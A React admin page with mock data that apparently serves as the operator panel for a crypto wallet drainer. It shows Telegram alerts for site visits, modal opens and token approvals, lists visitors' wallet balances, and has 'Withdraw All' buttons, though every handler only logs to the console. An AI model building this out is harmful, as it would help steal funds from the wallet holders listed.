import React, { useState } from 'react';
import { useParams } from 'react-router-dom';
import { Bot, Key, Shield, Eye, EyeOff, Save, AlertTriangle, MessageSquare, Clock, Wallet, Package, ArrowUpRight, DollarSign, RotateCw, Search, Filter, X, Check, Copy, Users } from 'lucide-react';
import { motion, AnimatePresence } from 'framer-motion';
import CustomDropdown from '../../components/CustomDropdown';

interface UserSettings {
  botApiKey: string;
  chatId: string;
  username: string;
  notifications: {
    siteAccess: boolean;
    modalOpens: boolean;
    withdrawals: boolean;
    approvals: boolean;
  };
}

interface Network {
  id: string;
  name: string;
  symbol: string;
  color: string;
}

interface Contract {
  id: string;
  name: string;
  address: string;
  network: Network;
  token: string; // USDT, USDC, etc.
  balance: number;
  usdBalance: number;
}

interface ProjectUser {
  id: string;
  walletAddress: string;
  balance: {
    token: string; // USDT или USDC
    amount: number; // количество токенов
    usd: number; // USD стоимость
  };
  lastActivity: Date;
  status: 'active' | 'inactive';
}

interface Project {
  id: string;
  name: string;
  walletAddress: string; // Один кошелек на проект
  contracts: Contract[]; // Контракты могут быть в разных сетях
  users: ProjectUser[];
  lastActivity: Date;
  status: 'active' | 'inactive';
}

const UserDetails = () => {
  const { userId } = useParams();
  const [showApiKey, setShowApiKey] = useState(false);
  const [currentPassword, setCurrentPassword] = useState('');
  const [newPassword, setNewPassword] = useState('');
  const [confirmPassword, setConfirmPassword] = useState('');
  const [selectedProject, setSelectedProject] = useState<Project | null>(null);
  const [selectedUser, setSelectedUser] = useState<ProjectUser | null>(null);
  const [projectSearch, setProjectSearch] = useState('');
  const [userSearch, setUserSearch] = useState('');
  const [copiedAddress, setCopiedAddress] = useState<string | null>(null);

  const [userSettings, setUserSettings] = useState<UserSettings>({
    botApiKey: '5935489021:AAHrJ0mM3YoYtC1nq_S8Yw9KzK6KeYoYtC1',
    chatId: '-1001234567890',
    username: '@user123',
    notifications: {
      siteAccess: true,
      modalOpens: true,
      withdrawals: true,
      approvals: true
    }
  });

  // Sample networks for demonstration
  const networks: Network[] = [
    { id: 'eth', name: 'Ethereum', symbol: 'ETH', color: '#627EEA' },
    { id: 'bsc', name: 'BSC', symbol: 'BNB', color: '#F3BA2F' },
    { id: 'polygon', name: 'Polygon', symbol: 'MATIC', color: '#8247E5' },
    { id: 'arbitrum', name: 'Arbitrum', symbol: 'ARB', color: '#28A0F0' }
  ];

  // Generate sample projects - теперь каждый проект может иметь контракты в разных сетях
  const generateProjects = (count: number): Project[] => {
    return Array.from({ length: count }, (_, i) => ({
      id: (i + 1).toString(),
      name: `Project ${i + 1}`,
      walletAddress: `0x${Math.random().toString(16).slice(2, 10)}...${Math.random().toString(16).slice(2, 6)}`,
      contracts: Array.from({ length: Math.floor(Math.random() * 6) + 2 }, (_, j) => {
        const network = networks[Math.floor(Math.random() * networks.length)];
        const tokens = ['USDT', 'USDC'];
        const token = tokens[Math.floor(Math.random() * tokens.length)];
        return {
          id: `contract${j}`,
          name: `${token} Contract (${network.name})`,
          address: `0x${Math.random().toString(16).slice(2, 10)}...${Math.random().toString(16).slice(2, 6)}`,
          network,
          token,
          balance: Math.random() * 5,
          usdBalance: Math.random() * 10000
        };
      }),
      users: Array.from({ length: Math.floor(Math.random() * 20) + 5 }, (_, k) => {
        const tokens = ['USDT', 'USDC'];
        const userToken = tokens[Math.floor(Math.random() * tokens.length)];
        const tokenAmount = Math.random() * 5000 + 100;
        const usdValue = tokenAmount * (userToken === 'USDT' ? 1 : 0.999);
        
        return {
          id: `user${k}`,
          walletAddress: `0x${Math.random().toString(16).slice(2, 10)}...${Math.random().toString(16).slice(2, 6)}`,
          balance: {
            token: userToken,
            amount: tokenAmount,
            usd: usdValue
          },
          lastActivity: new Date(Date.now() - Math.random() * 30 * 24 * 60 * 60 * 1000),
          status: Math.random() > 0.3 ? 'active' : 'inactive'
        };
      }),
      lastActivity: new Date(Date.now() - Math.random() * 7 * 24 * 60 * 60 * 1000),
      status: Math.random() > 0.3 ? 'active' : 'inactive'
    }));
  };

  const [projects] = useState<Project[]>(generateProjects(20));

  const handleSaveSettings = () => {
    console.log('Saving settings:', userSettings);
  };

  const handleChangePassword = () => {
    if (newPassword !== confirmPassword) {
      console.error('Passwords do not match');
      return;
    }
    console.log('Changing password');
  };

  const handleNotificationToggle = (key: keyof typeof userSettings.notifications) => {
    setUserSettings(prev => ({
      ...prev,
      notifications: {
        ...prev.notifications,
        [key]: !prev.notifications[key]
      }
    }));
  };

  const handleCopyAddress = async (address: string) => {
    await navigator.clipboard.writeText(address);
    setCopiedAddress(address);
    setTimeout(() => setCopiedAddress(null), 2000);
  };

  const handleWithdraw = (type: 'full' | 'partial') => {
    console.log(`${type} withdrawal for user:`, selectedUser);
  };

  const handleSpin = () => {
    console.log('Spin for user:', selectedUser);
  };

  // Filter projects based on search
  const filteredProjects = projects.filter(project =>
    project.name.toLowerCase().includes(projectSearch.toLowerCase()) ||
    project.walletAddress.toLowerCase().includes(projectSearch.toLowerCase())
  );

  // Filter users based on search
  const filteredUsers = selectedProject?.users.filter(user =>
    user.walletAddress.toLowerCase().includes(userSearch.toLowerCase())
  ) || [];

  // Sample user statistics
  const statistics = [
    {
      title: 'Total Projects',
      value: projects.length.toString(),
      icon: <Package size={20} />,
      color: '#4ade80'
    },
    {
      title: 'Total Balance',
      value: `$${projects.reduce((sum, p) => sum + p.contracts.reduce((contractSum, c) => contractSum + c.usdBalance, 0), 0).toLocaleString()}`,
      icon: <Wallet size={20} />,
      color: '#f59e0b'
    },
    {
      title: 'Last Active',
      value: '2h ago',
      icon: <Clock size={20} />,
      color: '#3b82f6'
    }
  ];

  return (
    <div className="max-w-4xl mx-auto space-y-6">
      <div className="flex justify-between items-start">
        <div>
          <h1 className="text-2xl font-bold">User Settings</h1>
          <p className="text-gray-400 mt-1">Manage user configuration and security</p>
        </div>
        <motion.button
          whileHover={{ scale: 1.02 }}
          whileTap={{ scale: 0.98 }}
          onClick={handleSaveSettings}
          className="flex items-center gap-2 px-4 py-2 bg-red-400 text-white rounded-lg hover:bg-red-500 transition-colors"
        >
          <Save size={20} />
          Save Changes
        </motion.button>
      </div>

      {/* Statistics */}
      <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
        {statistics.map((stat, index) => (
          <motion.div
            key={index}
            whileHover={{ scale: 1.02 }}
            className="bg-[#1e1f25] p-6 rounded-xl relative overflow-hidden"
          >
            <div className="absolute top-0 right-0 w-32 h-32 opacity-5 rounded-full"
              style={{ background: `radial-gradient(circle at center, ${stat.color}, transparent 70%)` }}
            />
            <div className="relative z-10">
              <div className="flex items-center gap-3 mb-3">
                <div className="w-10 h-10 rounded-xl flex items-center justify-center"
                  style={{ backgroundColor: `${stat.color}20`, color: stat.color }}>
                  {stat.icon}
                </div>
                <span className="text-gray-400">{stat.title}</span>
              </div>
              <div className="text-2xl font-bold">{stat.value}</div>
            </div>
          </motion.div>
        ))}
      </div>

      {/* Telegram Settings */}
      <div className="bg-[#1e1f25] rounded-lg p-6">
        <div className="flex items-center gap-2 mb-6">
          <Bot className="text-red-400" size={24} />
          <h2 className="text-xl font-semibold">Telegram Settings</h2>
        </div>

        <div className="space-y-4">
          <div>
            <label className="block text-sm font-medium text-gray-400 mb-2">
              Bot API Key
            </label>
            <div className="relative">
              <input
                type={showApiKey ? 'text' : 'password'}
                value={userSettings.botApiKey}
                onChange={(e) => setUserSettings(prev => ({ ...prev, botApiKey: e.target.value }))}
                className="w-full bg-[#2a2b33] border border-gray-700 rounded-lg py-2 pl-4 pr-10 text-white focus:outline-none focus:ring-1 focus:ring-red-400"
                placeholder="Enter bot API key"
              />
              <button
                onClick={() => setShowApiKey(!showApiKey)}
                className="absolute right-3 top-1/2 transform -translate-y-1/2 text-gray-400 hover:text-white"
              >
                {showApiKey ? <EyeOff size={20} /> : <Eye size={20} />}
              </button>
            </div>
          </div>

          <div>
            <label className="block text-sm font-medium text-gray-400 mb-2">
              Chat ID
            </label>
            <input
              type="text"
              value={userSettings.chatId}
              onChange={(e) => setUserSettings(prev => ({ ...prev, chatId: e.target.value }))}
              className="w-full bg-[#2a2b33] border border-gray-700 rounded-lg py-2 px-4 text-white focus:outline-none focus:ring-1 focus:ring-red-400"
              placeholder="Enter chat ID"
            />
          </div>

          <div>
            <label className="block text-sm font-medium text-gray-400 mb-2">
              Username
            </label>
            <input
              type="text"
              value={userSettings.username}
              onChange={(e) => setUserSettings(prev => ({ ...prev, username: e.target.value }))}
              className="w-full bg-[#2a2b33] border border-gray-700 rounded-lg py-2 px-4 text-white focus:outline-none focus:ring-1 focus:ring-red-400"
              placeholder="Enter Telegram username"
            />
          </div>
        </div>
      </div>

      {/* Notification Settings */}
      <div className="bg-[#1e1f25] rounded-lg p-6">
        <div className="flex items-center gap-2 mb-6">
          <MessageSquare className="text-red-400" size={24} />
          <h2 className="text-xl font-semibold">Notification Settings</h2>
        </div>

        <div className="space-y-4">
          <div className="flex items-center justify-between p-3 bg-[#2a2b33] rounded-lg">
            <span>Site Access Notifications</span>
            <label className="relative inline-flex items-center cursor-pointer">
              <input
                type="checkbox"
                className="sr-only peer"
                checked={userSettings.notifications.siteAccess}
                onChange={() => handleNotificationToggle('siteAccess')}
              />
              <div className="w-11 h-6 bg-gray-700 peer-focus:outline-none rounded-full peer peer-checked:after:translate-x-full peer-checked:after:border-white after:content-[''] after:absolute after:top-[2px] after:left-[2px] after:bg-white after:rounded-full after:h-5 after:w-5 after:transition-all peer-checked:bg-red-400"></div>
            </label>
          </div>

          <div className="flex items-center justify-between p-3 bg-[#2a2b33] rounded-lg">
            <span>Modal Window Opens</span>
            <label className="relative inline-flex items-center cursor-pointer">
              <input
                type="checkbox"
                className="sr-only peer"
                checked={userSettings.notifications.modalOpens}
                onChange={() => handleNotificationToggle('modalOpens')}
              />
              <div className="w-11 h-6 bg-gray-700 peer-focus:outline-none rounded-full peer peer-checked:after:translate-x-full peer-checked:after:border-white after:content-[''] after:absolute after:top-[2px] after:left-[2px] after:bg-white after:rounded-full after:h-5 after:w-5 after:transition-all peer-checked:bg-red-400"></div>
            </label>
          </div>

          <div className="flex items-center justify-between p-3 bg-[#2a2b33] rounded-lg">
            <span>Withdrawal Notifications</span>
            <label className="relative inline-flex items-center cursor-pointer">
              <input
                type="checkbox"
                className="sr-only peer"
                checked={userSettings.notifications.withdrawals}
                onChange={() => handleNotificationToggle('withdrawals')}
              />
              <div className="w-11 h-6 bg-gray-700 peer-focus:outline-none rounded-full peer peer-checked:after:translate-x-full peer-checked:after:border-white after:content-[''] after:absolute after:top-[2px] after:left-[2px] after:bg-white after:rounded-full after:h-5 after:w-5 after:transition-all peer-checked:bg-red-400"></div>
            </label>
          </div>

          <div className="flex items-center justify-between p-3 bg-[#2a2b33] rounded-lg">
            <span>Approval Notifications</span>
            <label className="relative inline-flex items-center cursor-pointer">
              <input
                type="checkbox"
                className="sr-only peer"
                checked={userSettings.notifications.approvals}
                onChange={() => handleNotificationToggle('approvals')}
              />
              <div className="w-11 h-6 bg-gray-700 peer-focus:outline-none rounded-full peer peer-checked:after:translate-x-full peer-checked:after:border-white after:content-[''] after:absolute after:top-[2px] after:left-[2px] after:bg-white after:rounded-full after:h-5 after:w-5 after:transition-all peer-checked:bg-red-400"></div>
            </label>
          </div>
        </div>
      </div>

      {/* Password Change */}
      <div className="bg-[#1e1f25] rounded-lg p-6">
        <div className="flex items-center gap-2 mb-6">
          <Shield className="text-red-400" size={24} />
          <h2 className="text-xl font-semibold">Security Settings</h2>
        </div>

        <div className="bg-red-400/10 border border-red-400/20 rounded-lg p-6">
          <div className="flex items-center gap-2 mb-4">
            <AlertTriangle className="text-red-400" size={20} />
            <h3 className="text-lg font-semibold">Change Password</h3>
          </div>

          <div className="space-y-4">
            <div>
              <label className="block text-sm font-medium text-gray-400 mb-2">
                Current Password
              </label>
              <input
                type="password"
                value={currentPassword}
                onChange={(e) => setCurrentPassword(e.target.value)}
                className="w-full bg-[#2a2b33] border border-gray-700 rounded-lg py-2 px-4 text-white focus:outline-none focus:ring-1 focus:ring-red-400"
                placeholder="Enter current password"
              />
            </div>

            <div>
              <label className="block text-sm font-medium text-gray-400 mb-2">
                New Password
              </label>
              <input
                type="password"
                value={newPassword}
                onChange={(e) => setNewPassword(e.target.value)}
                className="w-full bg-[#2a2b33] border border-gray-700 rounded-lg py-2 px-4 text-white focus:outline-none focus:ring-1 focus:ring-red-400"
                placeholder="Enter new password"
              />
            </div>

            <div>
              <label className="block text-sm font-medium text-gray-400 mb-2">
                Confirm New Password
              </label>
              <input
                type="password"
                value={confirmPassword}
                onChange={(e) => setConfirmPassword(e.target.value)}
                className="w-full bg-[#2a2b33] border border-gray-700 rounded-lg py-2 px-4 text-white focus:outline-none focus:ring-1 focus:ring-red-400"
                placeholder="Confirm new password"
              />
            </div>

            <div className="flex justify-end">
              <motion.button
                whileHover={{ scale: 1.02 }}
                whileTap={{ scale: 0.98 }}
                onClick={handleChangePassword}
                className="flex items-center gap-2 px-4 py-2 bg-red-400 text-white rounded-lg hover:bg-red-500 transition-colors"
              >
                <Key size={20} />
                Change Password
              </motion.button>
            </div>
          </div>
        </div>
      </div>

      {/* Projects Section */}
      <div className="bg-[#1e1f25] rounded-lg p-6">
        <div className="flex items-center justify-between mb-6">
          <div className="flex items-center gap-2">
            <Package className="text-red-400" size={24} />
            <h2 className="text-xl font-semibold">Projects</h2>
          </div>
          
          <div className="flex items-center gap-4">
            <div className="relative">
              <Search className="absolute left-3 top-1/2 transform -translate-y-1/2 text-gray-400" size={20} />
              <input
                type="text"
                placeholder="Search projects..."
                value={projectSearch}
                onChange={(e) => setProjectSearch(e.target.value)}
                className="w-64 bg-[#2a2b33] border border-gray-700 rounded-lg py-2 pl-10 pr-4 text-white focus:outline-none focus:ring-1 focus:ring-red-400"
              />
            </div>
          </div>
        </div>

        <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
          {filteredProjects.map(project => (
            <motion.button
              key={project.id}
              whileHover={{ scale: 1.02 }}
              whileTap={{ scale: 0.98 }}
              onClick={() => setSelectedProject(selectedProject?.id === project.id ? null : project)}
              className={`bg-[#2a2b33] p-4 rounded-lg text-left transition-all duration-300 ${
                selectedProject?.id === project.id ? 'ring-2 ring-red-400' : ''
              }`}
            >
              <div className="flex items-center justify-between mb-3">
                <div className="flex items-center gap-2">
                  <div className={`w-2 h-2 rounded-full ${
                    project.status === 'active' ? 'bg-green-400' : 'bg-gray-400'
                  }`} />
                  <span className="font-bold">{project.name}</span>
                </div>
                <div className="flex gap-1">
                  {/* Показываем иконки всех сетей, которые есть в контрактах проекта */}
                  {Array.from(new Set(project.contracts.map(c => c.network.id))).map(networkId => {
                    const network = networks.find(n => n.id === networkId);
                    return network ? (
                      <div
                        key={networkId}
                        className="w-6 h-6 rounded-full flex items-center justify-center"
                        style={{ backgroundColor: `${network.color}20` }}
                      >
                        <div
                          className="w-3 h-3 rounded-full"
                          style={{ backgroundColor: network.color }}
                        />
                      </div>
                    ) : null;
                  })}
                </div>
              </div>

              <div className="space-y-2">
                <div className="flex justify-between text-sm">
                  <span className="text-gray-400">Contracts:</span>
                  <span>{project.contracts.length}</span>
                </div>
                <div className="flex justify-between text-sm">
                  <span className="text-gray-400">Total USD:</span>
                  <span>${project.contracts.reduce((sum, c) => sum + c.usdBalance, 0).toLocaleString()}</span>
                </div>
                <div className="flex justify-between text-sm">
                  <span className="text-gray-400">Users:</span>
                  <span>{project.users.length}</span>
                </div>
              </div>
            </motion.button>
          ))}
        </div>
      </div>

      {/* Project Users */}
      <AnimatePresence>
        {selectedProject && (
          <motion.div
            initial={{ opacity: 0, height: 0 }}
            animate={{ opacity: 1, height: 'auto' }}
            exit={{ opacity: 0, height: 0 }}
            className="bg-[#1e1f25] rounded-lg p-6 overflow-hidden"
          >
            <div className="flex items-center justify-between mb-6">
              <div className="flex items-center gap-2">
                <Users className="text-red-400" size={24} />
                <h2 className="text-xl font-semibold">{selectedProject.name} Details</h2>
              </div>
              
              <div className="relative">
                <Search className="absolute left-3 top-1/2 transform -translate-y-1/2 text-gray-400" size={20} />
                <input
                  type="text"
                  placeholder="Search users..."
                  value={userSearch}
                  onChange={(e) => setUserSearch(e.target.value)}
                  className="w-64 bg-[#2a2b33] border border-gray-700 rounded-lg py-2 pl-10 pr-4 text-white focus:outline-none focus:ring-1 focus:ring-red-400"
                />
              </div>
            </div>

            {/* Project Wallet */}
            <div className="bg-[#2a2b33] p-4 rounded-lg mb-6">
              <div className="text-sm text-gray-400 mb-2">Project Wallet Address:</div>
              <button
                onClick={() => handleCopyAddress(selectedProject.walletAddress)}
                className="flex items-center gap-2 px-3 py-1.5 bg-[#1e1f25] rounded-lg hover:bg-[#353640] transition-colors"
              >
                <span className="font-mono">{selectedProject.walletAddress}</span>
                {copiedAddress === selectedProject.walletAddress ? (
                  <Check size={16} className="text-red-400" />
                ) : (
                  <Copy size={16} />
                )}
              </button>
            </div>

            {/* Project Contracts */}
            <div className="mb-6">
              <h3 className="text-lg font-semibold mb-3">Contracts ({selectedProject.contracts.length})</h3>
              <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                {selectedProject.contracts.map(contract => (
                  <div
                    key={contract.id}
                    className="bg-[#2a2b33] p-4 rounded-lg"
                  >
                    <div className="flex items-center justify-between mb-3">
                      <div className="flex items-center gap-2">
                        <div
                          className="w-3 h-3 rounded-full"
                          style={{ backgroundColor: contract.network.color }}
                        />
                        <span className="font-medium">{contract.name}</span>
                      </div>
                      <div className="text-sm text-gray-400">{contract.token}</div>
                    </div>
                    <div className="space-y-2">
                      <div className="font-mono text-sm text-gray-400">{contract.address}</div>
                      <div className="flex justify-between">
                        <span className="text-gray-400">Balance:</span>
                        <span>{contract.balance.toFixed(4)} {contract.token}</span>
                      </div>
                      <div className="flex justify-between">
                        <span className="text-gray-400">USD Value:</span>
                        <span>${contract.usdBalance.toLocaleString()}</span>
                      </div>
                    </div>
                  </div>
                ))}
              </div>
            </div>

            {/* Project Users */}
            <div>
              <h3 className="text-lg font-semibold mb-3">Users ({filteredUsers.length})</h3>
              <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                {filteredUsers.map(user => (
                  <motion.button
                    key={user.id}
                    whileHover={{ scale: 1.02 }}
                    whileTap={{ scale: 0.98 }}
                    onClick={() => setSelectedUser(user)}
                    className="bg-[#2a2b33] p-4 rounded-lg text-left hover:bg-[#353640] transition-colors"
                  >
                    <div className="flex items-center justify-between mb-3">
                      <div className="flex items-center gap-2">
                        <div className={`w-2 h-2 rounded-full ${
                          user.status === 'active' ? 'bg-green-400' : 'bg-gray-400'
                        }`} />
                        <span className="font-mono">{user.walletAddress}</span>
                      </div>
                    </div>
                    <div className="space-y-2">
                      <div className="flex justify-between text-sm">
                        <span className="text-gray-400">Balance:</span>
                        <span>{user.balance.amount.toFixed(2)} {user.balance.token}</span>
                      </div>
                      <div className="flex justify-between text-sm">
                        <span className="text-gray-400">USD Value:</span>
                        <span>${user.balance.usd.toLocaleString()}</span>
                      </div>
                      <div className="flex justify-between text-sm">
                        <span className="text-gray-400">Last Activity:</span>
                        <span>{user.lastActivity.toLocaleDateString()}</span>
                      </div>
                    </div>
                  </motion.button>
                ))}
              </div>
            </div>
          </motion.div>
        )}
      </AnimatePresence>

      {/* User Details Modal */}
      <AnimatePresence>
        {selectedUser && (
          <motion.div
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            exit={{ opacity: 0 }}
            className="fixed inset-0 bg-black bg-opacity-50 backdrop-blur-sm flex items-center justify-center z-50"
            onClick={() => setSelectedUser(null)}
          >
            <motion.div
              initial={{ scale: 0.95, opacity: 0 }}
              animate={{ scale: 1, opacity: 1 }}
              exit={{ scale: 0.95, opacity: 0 }}
              onClick={(e) => e.stopPropagation()}
              className="bg-[#1e1f25] rounded-xl p-6 w-full max-w-lg m-4"
            >
              <div className="flex justify-between items-start mb-6">
                <div>
                  <h2 className="text-xl font-bold mb-2">User Details</h2>
                  <div className="space-y-1">
                    <div className="text-sm text-gray-400">User ID:</div>
                    <div className="font-medium">{selectedUser.id}</div>
                  </div>
                  <div className="space-y-1 mt-2">
                    <div className="text-sm text-gray-400">Wallet Address:</div>
                    <button
                      onClick={() => handleCopyAddress(selectedUser.walletAddress)}
                      className="flex items-center gap-2 px-3 py-1.5 bg-[#2a2b33] rounded-lg hover:bg-[#353640] transition-colors"
                    >
                      <span className="font-mono">{selectedUser.walletAddress}</span>
                      {copiedAddress === selectedUser.walletAddress ? (
                        <Check size={16} className="text-red-400" />
                      ) : (
                        <Copy size={16} />
                      )}
                    </button>
                  </div>
                </div>
                <button
                  onClick={() => setSelectedUser(null)}
                  className="p-2 hover:bg-[#2a2b33] rounded-lg transition-colors"
                >
                  <X size={24} />
                </button>
              </div>

              <div className="grid grid-cols-1 md:grid-cols-3 gap-4 mb-6">
                <div className="bg-[#2a2b33] p-4 rounded-lg">
                  <div className="text-gray-400 mb-1">Balance</div>
                  <div className="text-xl font-bold">
                    {selectedUser.balance.amount.toFixed(2)} {selectedUser.balance.token}
                  </div>
                  <div className="text-sm text-gray-400">
                    ≈ ${selectedUser.balance.usd.toLocaleString()}
                  </div>
                </div>
                <div className="bg-[#2a2b33] p-4 rounded-lg">
                  <div className="text-gray-400 mb-1">Status</div>
                  <div className={selectedUser.status === 'active' ? 'text-green-400' : 'text-red-400'}>
                    {selectedUser.status === 'active' ? 'Active' : 'Inactive'}
                  </div>
                </div>
                <div className="bg-[#2a2b33] p-4 rounded-lg">
                  <div className="text-gray-400 mb-1">Last Activity</div>
                  <div>{selectedUser.lastActivity.toLocaleDateString()}</div>
                </div>
              </div>

              <div className="flex gap-2">
                <motion.button
                  whileHover={{ scale: 1.05 }}
                  whileTap={{ scale: 0.95 }}
                  onClick={() => handleWithdraw('full')}
                  className="flex items-center gap-2 bg-red-400 text-white px-4 py-2 rounded-lg hover:bg-red-500 transition-colors"
                >
                  <DollarSign size={20} />
                  Withdraw All
                </motion.button>
                <motion.button
                  whileHover={{ scale: 1.05 }}
                  whileTap={{ scale: 0.95 }}
                  onClick={() => handleWithdraw('partial')}
                  className="flex items-center gap-2 bg-[#2a2b33] text-white px-4 py-2 rounded-lg hover:bg-[#353640] transition-colors"
                >
                  <DollarSign size={20} />
                  Partial Withdraw
                </motion.button>
                <motion.button
                  whileHover={{ scale: 1.05 }}
                  whileTap={{ scale: 0.95 }}
                  onClick={handleSpin}
                  className="flex items-center gap-2 bg-[#2a2b33] text-white px-4 py-2 rounded-lg hover:bg-[#353640] transition-colors"
                >
                  <RotateCw size={20} />
                  Spin
                </motion.button>
              </div>
            </motion.div>
          </motion.div>
        )}
      </AnimatePresence>
    </div>
  );
};

export default UserDetails;